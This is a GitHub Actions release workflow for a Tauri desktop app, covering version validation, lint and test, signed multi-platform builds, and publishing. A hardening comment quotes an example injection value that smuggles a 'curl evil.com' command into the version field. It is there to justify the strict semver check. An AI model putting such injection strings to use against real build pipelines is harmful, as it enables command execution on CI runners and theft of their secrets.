name: Release

# Desktop releases use release-desktop.yml on v* tags. This workflow is manual-only to avoid duplicate drafts.
on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Release version (e.g., 1.1.3)'
        required: true

permissions:
  contents: read

env:
  RUST_VERSION: '1.94.0'
  NODE_VERSION: '22'

jobs:
  create-release:
    name: Create Release
    runs-on: ubuntu-latest
    permissions:
      contents: write
    outputs:
      release_id: ${{ steps.create-release.outputs.result }}
      version: ${{ env.VERSION }}
    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Get version
        # SECURITY (C1 hardening, redteam-services 2026-05-04): validate version
        # before exporting. Dispatch-only access still warrants input validation —
        # an attacker with write access could otherwise inject shell via
        # `1.0.0"; curl evil.com; "` into the version field.
        env:
          DISPATCH_VERSION: ${{ github.event.inputs.version }}
        run: |
          if [ -n "${DISPATCH_VERSION:-}" ]; then
            CANDIDATE="$DISPATCH_VERSION"
          else
            CANDIDATE="${GITHUB_REF#refs/tags/v}"
          fi
          # Strict semver allowlist: digits.digits.digits[-prerelease][+build] (no shell metas).
          if ! printf '%s' "$CANDIDATE" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+([.-][A-Za-z0-9.-]+)?(\+[A-Za-z0-9.-]+)?$'; then
            echo "ERROR: invalid version format: $CANDIDATE" >&2
            exit 1
          fi
          echo "VERSION=$CANDIDATE" >> "$GITHUB_ENV"

      - name: Create release
        id: create-release
        uses: actions/github-script@v8
        with:
          script: |
            const { data } = await github.rest.repos.createRelease({
              owner: context.repo.owner,
              repo: context.repo.repo,
              tag_name: `v${process.env.VERSION}`,
              name: `AGI Workforce v${process.env.VERSION}`,
              body: `Release v${process.env.VERSION}`,
              draft: true,
              prerelease: false
            })
            return data.id

  validate:
    name: Validate (lint + typecheck + test)
    runs-on: ubuntu-latest
    needs: create-release
    steps:
      - uses: actions/checkout@v6
      - uses: pnpm/action-setup@a8198c4bff370c8506180b035930dea56dbd5288 # v5
        with:
          version: 9.15.3
      - uses: actions/setup-node@v6
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'pnpm'
      - name: Install dependencies
        run: pnpm install --frozen-lockfile
      - name: Lint
        run: pnpm lint
      - name: Type check
        run: pnpm typecheck:all
      - name: Test
        run: pnpm test

  build-tauri:
    name: Build ${{ matrix.platform }}
    needs: [create-release, validate]
    permissions:
      contents: write
    strategy:
      fail-fast: false
      matrix:
        include:
          - platform: 'windows-latest'
            args: ''
          - platform: 'ubuntu-22.04'
            args: ''
          - platform: 'macos-latest'
            args: '--target universal-apple-darwin'

    runs-on: ${{ matrix.platform }}
    timeout-minutes: 60

    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Setup pnpm
        uses: pnpm/action-setup@a8198c4bff370c8506180b035930dea56dbd5288 # v5
        with:
          version: 9.15.3

      - name: Setup Node.js
        uses: actions/setup-node@v6
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'pnpm'

      - name: Setup Rust
        uses: actions-rust-lang/setup-rust-toolchain@1fbea72663f6d4c03efaab13560c8a24cfd2a7cc # v1.9.0
        with:
          toolchain: ${{ env.RUST_VERSION }}

      - name: Install Rust targets (macOS)
        if: matrix.platform == 'macos-latest'
        run: |
          rustup target add aarch64-apple-darwin
          rustup target add x86_64-apple-darwin

      - name: Install Linux dependencies
        if: matrix.platform == 'ubuntu-22.04'
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            libwebkit2gtk-4.1-dev \
            build-essential \
            curl \
            wget \
            file \
            libxdo-dev \
            libssl-dev \
            libayatana-appindicator3-dev \
            librsvg2-dev \
            pkg-config \
            libleptonica-dev \
            libpng-dev \
            libjpeg-dev \
            libtiff-dev \
            zlib1g-dev \
            libwebp-dev

      - name: Cache Rust dependencies
        uses: Swatinem/rust-cache@23869a5bd66c73db3c0ac40331f3206eb23791dc # v2.9.1
        with:
          workspaces: apps/desktop/src-tauri

      - name: Install JavaScript dependencies
        run: pnpm install --frozen-lockfile

      - name: Mask Tauri signing secrets
        run: |
          echo "::add-mask::${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}"
          echo "::add-mask::${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}"

      - name: Build Tauri app
        uses: tauri-apps/tauri-action@84b9d35b5fc46c1e45415bdb6144030364f7ebc5 # v0.6.2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
          APPLE_CERTIFICATE: ${{ secrets.APPLE_CERTIFICATE }}
          APPLE_CERTIFICATE_PASSWORD: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}
          APPLE_SIGNING_IDENTITY: ${{ secrets.APPLE_SIGNING_IDENTITY }}
          APPLE_ID: ${{ secrets.APPLE_ID }}
          APPLE_PASSWORD: ${{ secrets.APPLE_PASSWORD }}
          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
        with:
          releaseId: ${{ needs.create-release.outputs.release_id }}
          args: ${{ matrix.args }}

  publish-release:
    name: Publish Release
    needs: [create-release, build-tauri]
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Publish release
        uses: actions/github-script@v8
        env:
          # SECURITY (C1 hardening, redteam-services 2026-05-04): pass release_id via env
          # to keep the github-script body free of ${{ }} interpolation. release_id is a
          # numeric API value, but env-passthrough is the safer default pattern.
          RELEASE_ID: ${{ needs.create-release.outputs.release_id }}
        with:
          script: |
            const releaseId = Number(process.env.RELEASE_ID);
            if (!Number.isInteger(releaseId) || releaseId <= 0) {
              throw new Error(`Invalid release_id: ${process.env.RELEASE_ID}`);
            }
            await github.rest.repos.updateRelease({
              owner: context.repo.owner,
              repo: context.repo.repo,
              release_id: releaseId,
              draft: false
            })
